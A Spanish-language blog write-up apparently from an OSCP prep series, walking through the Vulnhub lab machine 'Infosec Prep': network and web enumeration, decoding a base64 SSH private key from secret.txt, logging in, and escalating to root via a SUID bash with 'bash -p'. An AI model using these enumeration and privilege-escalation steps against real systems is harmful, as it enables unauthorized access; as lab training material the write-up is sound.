---
title: Infosec Prep Writeup - Vulnhub
date: 2025-03-12
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Infosec, OSCP Prep]
image:
  path: /assets/img/commons/vulnhub/infosecprep/portada.png
---

Anterior [*OSCP Lab 19*](https://lvs3c.github.io/posts/OSCP-eLection1/)

¡Saludos!

**`OSCP Lab 20`**

En este writeup, realizaremos la máquina [**Infosec Prep**](https://www.vulnhub.com/entry/infosec-prep-oscp,508/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- Desencriptar cadena obteniendo la **Clave privada** del usuario.
- Y por último, tenemos permisos **SUID** sobre la bash, elevamos nuestros privilegios y listamos la root flag.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.53     00:0c:29:b9:54:f6       VMware, Inc.
10.11.12.200    00:50:56:e9:ee:69       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.400 seconds (106.67 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.53
PING 10.11.12.53 (10.11.12.53) 56(84) bytes of data.
64 bytes from 10.11.12.53: icmp_seq=1 ttl=64 time=0.415 ms

--- 10.11.12.53 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.415/0.415/0.415/0.000 ms
```

## Escaneo - Enumeración

---

A continuación, realizamos un escaneo con `Nmap`.

```bash
❯ sudo nmap -p- -sCV 10.11.12.53 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 22:41 -03

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: OSCP Voucher &#8211; Just another WordPress site
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-generator: WordPress 5.4.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/11%Time=67D0E64B%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
MAC Address: 00:0C:29:B9:54:F6 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.27 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 8.2p1`.
- Puerto `80` servidor `Apache httpd 2.4.41`.


### HTTP - 80

![web80](/assets/img/commons/vulnhub/infosecprep/web80.png){: .center-image }
![oscp](/assets/img/commons/vulnhub/infosecprep/oscp.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ sudo nmap -p80 --script http-enum 10.11.12.53 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 22:46 -03
Nmap scan report for 10.11.12.53
Host is up (0.00021s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.4.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
MAC Address: 00:0C:29:B9:54:F6 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
```

Lanzamos `gobuster` para tener más información.

```bash
❯ gobuster dir -u http://10.11.12.53 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -b 403,404 -x php,txt,html,sh,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.53
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html,sh
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.53/index.php            (Status: 301) [Size: 0] [--> http://10.11.12.53/]
http://10.11.12.53/wp-content           (Status: 301) [Size: 315] [--> http://10.11.12.53/wp-content/]
http://10.11.12.53/wp-login.php         (Status: 200) [Size: 4778]
http://10.11.12.53/license.txt          (Status: 200) [Size: 19915]
http://10.11.12.53/wp-includes          (Status: 301) [Size: 316] [--> http://10.11.12.53/wp-includes/]
http://10.11.12.53/javascript           (Status: 301) [Size: 315] [--> http://10.11.12.53/javascript/]
http://10.11.12.53/readme.html          (Status: 200) [Size: 7278]
http://10.11.12.53/robots.txt           (Status: 200) [Size: 36]
http://10.11.12.53/wp-trackback.php     (Status: 200) [Size: 135]
http://10.11.12.53/secret.txt           (Status: 200) [Size: 3502]
http://10.11.12.53/wp-admin             (Status: 301) [Size: 313] [--> http://10.11.12.53/wp-admin/]
http://10.11.12.53/xmlrpc.php           (Status: 405) [Size: 42]
http://10.11.12.53/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.11.12.53/wp-login.php?action=register]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Validamos el archivo `secret.txt`.

![secret](/assets/img/commons/vulnhub/infosecprep/secret.png){: .center-image }

Desencriptamos la cadena en base64.

![secretb64](/assets/img/commons/vulnhub/infosecprep/secretb64.png){: .center-image }

Obtenemos una clave privada de ssh y como vimos sólo existe el usuario `oscp`.


## Explotación

---

Ingresamos por SSH utilizando la clave privada.

```bash
❯ ssh oscp@10.11.12.53 -i secretb64
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 12 Mar 2025 01:59:09 AM UTC

  System load:  0.0                Processes:             211
  Usage of /:   26.0% of 19.56GB   Users logged in:       0
  Memory usage: 77%                IPv4 address for eth0: 10.11.12.53
  Swap usage:   1%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar 12 01:52:09 2025 from 10.11.12.10
-bash-5.0$
```


## Escalación de privilegios

---

Listamos los permisos `SUID`{: .filepath} del sistema y vemos que tenemos permisos sobre la `bash`{: .filepath}, la ejecutamos con privilegios y somos root.

Listamos la root flag.

```bash
bash-5.0$ find / -perm -4000 2>/dev/null | grep -v snap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/bash
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
bash-5.0$ bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# cd /root/
bash-5.0# ls
fix-wordpress  flag.txt  snap
bash-5.0# cat flag.txt
d73b04b0e696b0945283defa3eee4538
```

Hope it helps!